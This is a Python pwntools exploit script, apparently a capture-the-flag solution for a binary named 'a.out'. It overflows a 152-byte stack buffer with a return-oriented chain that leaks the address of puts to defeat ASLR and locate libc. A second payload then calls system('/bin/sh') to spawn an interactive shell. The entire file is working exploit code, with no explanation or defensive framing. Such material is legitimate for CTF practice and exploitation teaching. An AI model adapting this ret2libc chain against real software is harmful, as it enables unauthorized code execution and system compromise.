from pwn import *
import sys

exe = ELF("./a.out")
context.binary = exe.path
HOST = ""
PORT = -1


def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    elif args.TRACE:
        r = process(["strace", "-o", "strace.out", exe.path])
    else:
        r = process([exe.path])
    return r


def main():
    r = conn()
    gdb.attach(r)
    rop = ROP(exe)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    rop.raw("a" * 152)
    rop.puts(exe.got["puts"])
    rop.call(0x000000000040125E)  # main function
    log.info("obtaining address leak of puts:\n" + rop.dump())

    r.recvuntil("input: ".encode())

    r.sendline((rop.chain()))
    leakedPut = r.recvline()[:8].strip()
    log.success("leaked puts : {}".format(leakedPut))

    leakedPut = int.from_bytes(leakedPut, byteorder="little")

    libc.address = leakedPut - libc.symbols["puts"]

    pop_rdi = p64(0x0000000000401353)
    sh = p64(next(libc.search(b"/bin/sh")))  # target libc
    sys = p64(libc.symbols["system"])
    padding = b"a" * 152
    # stack_alignment = p64(0x0000000000401361)

    r.recvuntil("A kind gift from Themis, to you.\n".encode())
    # payload = padding + pop_rdi + sh + stack_alignment + sys
    payload = padding + pop_rdi + sh + sys
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
